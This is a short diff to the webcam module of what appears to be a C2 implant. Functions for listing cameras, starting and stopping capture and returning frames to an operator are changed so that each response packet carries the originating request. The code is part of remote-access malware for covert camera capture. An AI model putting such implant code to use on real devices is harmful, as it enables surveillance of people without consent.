@@ -294,13 +294,13 @@ static tlv_pkt_t *cam_frame(c2_t *c2)
 
         if (frame != nil)
         {
-            result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+            result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
             tlv_pkt_add_bytes(result, TLV_TYPE_BYTES, (unsigned char *)frame.bytes, frame.length);
             return result;
         }
     }
 
-    return api_craft_tlv_pkt(API_CALL_FAIL);
+    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
 }
 
 static tlv_pkt_t *cam_list(c2_t *c2)
@@ -312,7 +312,7 @@ static tlv_pkt_t *cam_list(c2_t *c2)
     AVCaptureDeviceDiscoverySession *discoverySession;
     NSArray *devices;
 
-    result = api_craft_tlv_pkt(API_CALL_SUCCESS);
+    result = api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 
     @autoreleasepool
     {
@@ -350,7 +350,7 @@ static tlv_pkt_t *cam_start(c2_t *c2)
                 log_debug("* Frame is somehow nil?\n");
             }
 
-            return api_craft_tlv_pkt(API_CALL_SUCCESS);
+            return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
         }
         else
         {
@@ -358,7 +358,7 @@ static tlv_pkt_t *cam_start(c2_t *c2)
         }
     }
 
-    return api_craft_tlv_pkt(API_CALL_FAIL);
+    return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
 }
 
 static tlv_pkt_t *cam_stop(c2_t *c2)
@@ -368,7 +368,7 @@ static tlv_pkt_t *cam_stop(c2_t *c2)
         [cam stop];
     }
 
-    return api_craft_tlv_pkt(API_CALL_SUCCESS);
+    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
 }
 
 void register_cam_api_calls(api_calls_t **api_calls)
